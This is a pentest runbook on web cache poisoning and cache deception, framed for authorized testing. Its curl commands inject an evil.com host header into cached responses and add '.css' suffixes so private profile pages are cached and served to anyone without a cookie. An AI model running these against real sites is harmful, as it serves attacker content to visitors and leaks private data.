---
title: "Cache Poisoning & Cache Deception"
description: "Exploiting unkeyed inputs to poison shared caches and tricking caches into storing private pages, from X-Forwarded-Host to parameter cloaking."
phase: Web
order: 16
tags:
  - web-cache
  - poisoning
  - deception
  - http
tools:
  - burp suite
  - param miner
  - curl
updated: 2026-10-01
---

A runbook for authorized cache testing on **in-scope** targets. Goal: prove an unkeyed input changes a cached response, or that a private page gets stored and served to others. Always use a cache buster.

## 1. Detect whether a cache exists

Send a request twice and compare cache headers, using a unique buster.

```bash
cb=$(date +%s)
curl -sI "https://target/?cb=$cb" | grep -iE 'x-cache|cf-cache-status|age|cache-control|via'
curl -sI "https://target/?cb=$cb" | grep -iE 'x-cache|cf-cache-status|age'
```

A changing `Age` or a `HIT` status confirms caching. `X-Cache: miss` then `hit` is the classic signature.

## 2. Find unkeyed inputs

Use Param Miner to discover headers/params that are unkeyed but reflected; then verify by hand.

```bash
# Param Miner runs inside Burp (right-click -> Extensions -> Param Miner).
# Manual confirmation of a candidate unkeyed header:
cb=$(date +%s)
curl -s "https://target/?cb=$cb" -H "X-Forwarded-Host: evil.com" | grep -i evil.com
```

Common carriers: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Original-URL`, unkeyed cookies, `X-Forwarded-For`.

## 3. Poison via reflected headers

If a header reflection lands in a link, script, or redirect and the cache stores it, every later visitor gets your content.

```bash
# Cache the poisoned response under a stable key
curl -s "https://target/?cb=1" -H "X-Forwarded-Host: evil.com" -o poisoned.html
grep -i evil.com poisoned.html

# Fetch WITHOUT the header to see if the poisoned body is served
curl -s "https://target/?cb=1" | grep -i evil.com
```

## 4. Parameter cloaking and parsing gaps

- Cache and backend may parse differently: `?a=1&b=2` vs `?a=1%26b=2`.
- Duplicate params (`?utm=x&utm=y`) where the cache keys one and the app reads the other.
- Semicolons, encoded `&`, and case differences in parameter names.

Test each delimiter variant and compare bodies across the keyed/unkeyed paths.

## 5. Combine with reflected XSS

The highest impact is a payload carried by an unkeyed header and served from cache to all users. Confirm the cache actually stores and serves your response before claiming impact, and reduce to a minimal proof.

## 6. Cache deception

Force the cache to store a private page by appending a static-looking suffix.

```bash
for suffix in '.css' '/nonexistent.css' ';.css' '/..%2fstatic/style.css'; do
  curl -s -o /dev/null -w "$suffix -> %{http_code}\n" \
    -H "Cookie: session=..." "https://target/profile$suffix"
done

# Then fetch the same path with NO cookie: does the cached private body return?
curl -s "https://target/profile.css" | head
```

The origin returns the private profile; the cache keys on the `.css` extension and stores it.

## Full pipeline

```bash
# 1. Confirm caching
cb=$(date +%s)
curl -sI "https://target/?cb=$cb" | grep -iE 'x-cache|cf-cache-status|age|cache-control'
curl -sI "https://target/?cb=$cb" | grep -iE 'x-cache|cf-cache-status|age'

# 2. Test a reflected, unkeyed header
curl -s "https://target/?cb=1" -H "X-Forwarded-Host: evil.com" -o poisoned.html
grep -i evil.com poisoned.html

# 3. Verify it is served without the header
curl -s "https://target/?cb=1" | grep -i evil.com

# 4. Cache deception suffixes on a private page
for suffix in '.css' '/nonexistent.css' ';.css'; do
  curl -s -o /dev/null -w "$suffix -> %{http_code}\n" -H "Cookie: session=..." "https://target/profile$suffix"
done
curl -s "https://target/profile.css" | head   # no cookie
```

## Ethics & legality

- Only test targets within an authorized scope and always use a cache buster while probing.
- Never poison a cache in a way that affects real users; prove with your own account and short-lived keys.
- Report the poisoned key, stored response, and unauthenticated fetch as evidence.
